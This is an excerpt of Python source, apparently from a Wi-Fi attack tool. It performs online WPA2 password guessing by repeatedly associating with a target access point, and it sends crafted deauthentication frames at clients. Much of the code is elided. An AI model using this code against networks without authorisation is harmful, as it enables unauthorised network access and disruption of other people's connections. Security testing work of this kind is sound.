...
def _wait_for_dot11(
    iface: str, bssid: str, layer, timeout: float, client: str | None = None,
    send_fn=None, stop_event=None,
):
    ...
    def handler(pkt):
        if not pkt.addr2 or pkt.addr2.lower() != bssid_lower:
            return
        if client is not None and (not pkt.addr1 or pkt.addr1.lower() != client.lower()):
            return
...
def _associate(iface: str, bssid: str, client: str, ssid: str, timeout: float, stop_event=None) -> tuple[bool, str]:
    ...
    auth_resp = _wait_for_dot11(
        iface, bssid, Dot11Auth, timeout, client=client, stop_event=stop_event,
    ...
    assoc_resp = _wait_for_dot11(
        iface, bssid, Dot11AssoResp, timeout, client=client, stop_event=stop_event,
...
def _wait_for_m1(iface: str, bssid: str, client: str, timeout: float, stop_event=None):
    ...
    def handler(pkt):
        if not pkt.addr2 or pkt.addr2.lower() != bssid_lower:
            return
        if not pkt.addr1 or pkt.addr1.lower() != client.lower():
            return
...
def _wait_for_m3_or_reject(
    iface: str, bssid: str, client: str, timeout: float, send_fn, stop_event=None,
):
...
def _try_password(
    ...
    stop_event=None, pairwise_cipher: str | None = None,
) -> tuple[bool, str]:
    ...
    m1 = _wait_for_m1(iface, bssid, client, msg_timeout, stop_event=stop_event)
    if m1 is None:
        sendp(_craft_client_deauth(bssid, client), iface=iface, verbose=False)
    ...
    outcome, _pkt = _wait_for_m3_or_reject(
        iface, bssid, client, msg_timeout,
...
def online_guess(
    ...
    if try_fn is None:
        try_fn = partial(
            _try_password, stop_event=stop_event, pairwise_cipher=pairwise_cipher,
        )

    if pairwise_cipher == "TKIP":
        result = OnlineGuessResult(success=False, detail="TKIP targets are unsupported; CCMP/AES is required")
        log(result.detail)
        return result
